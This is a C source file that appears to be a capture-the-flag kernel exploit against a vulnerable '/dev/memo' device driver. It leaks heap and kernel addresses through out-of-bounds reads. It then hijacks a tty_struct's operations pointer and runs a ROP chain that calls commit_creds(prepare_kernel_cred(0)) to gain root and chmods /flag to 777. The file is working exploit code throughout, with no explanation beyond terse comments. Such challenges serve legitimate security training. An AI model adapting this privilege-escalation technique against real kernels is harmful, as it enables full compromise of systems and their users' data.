#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/socket.h> 


#define CALL(x) if( x < 0 ) { exit(-1); }

#define ROPPOS 0x320

int main(){
    setvbuf(stdout, 0, 2, 0);
    int fd = open("/dev/memo",O_RDWR);
   

      for(int i=0; i < 3; i++){
        int pid = open("/dev/ptmx",O_RDWR | O_NOCTTY);
        close(pid);
    }

    char * buf = malloc(0x400);

    for(int i=0; i<0x400; i++) { 
        buf[i] = 'A';
    }

    printf("fd : %d \n",fd);


    CALL(lseek(fd , 0x3f0 , SEEK_SET));
    CALL(read(fd , buf , 0x400));

    uint64_t heap = *((uint64_t *)buf + 10) - 0x38 - 0x400;

    printf("heap : %p \n",heap);


    //tty struct will allocate our heap
    *((uint64_t *)buf + 2) = heap;
    CALL(lseek(fd , 0x3f0 , SEEK_SET));
    CALL(write(fd , buf , 0x18));

    int newpid = open("/dev/ptmx",O_RDWR | O_NOCTTY);

    
    CALL(lseek(fd , 0 , SEEK_SET));
    CALL(read(fd , buf , 0x400));

    uint64_t do_tty_hangup = *((uint64_t *)buf + 74);
    uint64_t prepare_kernel_cred = do_tty_hangup - 0x393b60;
    uint64_t commit_creds = do_tty_hangup - 0x393e00;
    uint64_t do_fchmodat = do_tty_hangup - 0x26faa0;
    uint64_t msleep = do_tty_hangup - 0x34af70;
    uint64_t prdi = do_tty_hangup + 0x55e417;
    uint64_t prsi = do_tty_hangup - 0x40db37;
    uint64_t prdx = do_tty_hangup + 0x411eeb;
    uint64_t leaveret = do_tty_hangup + 0x4203b6;

    //leaveret spray
    for(int i=0; i < 15; i++){
        *((uint64_t *)buf + i) =  leaveret; // leave ret
    }

    CALL(lseek(fd , 0x2d0 , SEEK_SET));
    CALL(write(fd , buf , 15 * 8));


    //overwrite tty_operations pointer

    *((uint64_t *)buf) = heap+0x320-8; // rbp
    *((uint64_t *)buf+1) = heap + 0x2d0;

    CALL(lseek(fd , 0x10 , SEEK_SET));
    CALL(write(fd , buf , 0x10));




    printf("do_tty_hangup : %p \n", do_tty_hangup);

    uint64_t rop[100] = {0,};

    //commit_creds(prepare_kernel_cred(0));
    rop[0] = prdi; 
    rop[1] = 0;
    rop[2] = prepare_kernel_cred;
    rop[3] = prdx;
    rop[4] = do_tty_hangup + 0x4203b7; // ret
    rop[5] = do_tty_hangup + 0x40636d; // mov rdi , rax
    rop[6] = 0; //pop gadget...
    rop[12] = commit_creds;


    //chmod 777 /flag
    rop[13] = prdi;
    rop[14] = 0xffffff9c;
    rop[15] = prsi;
    rop[16] = heap + 0x3d8; // /flag string
    rop[17] = prdx;
    rop[18] = 0x1ff;
    rop[19] = do_fchmodat;


    //sleep(0x10000)
    rop[20] = prdi;
    rop[21] = 5000;
    rop[22] = msleep;

    rop[23] = 0x67616c662f; // flag

    CALL(lseek(fd , 0x320 , SEEK_SET));
    CALL(write(fd , &rop , 0xe0));

     //call close module (cleaup)
}
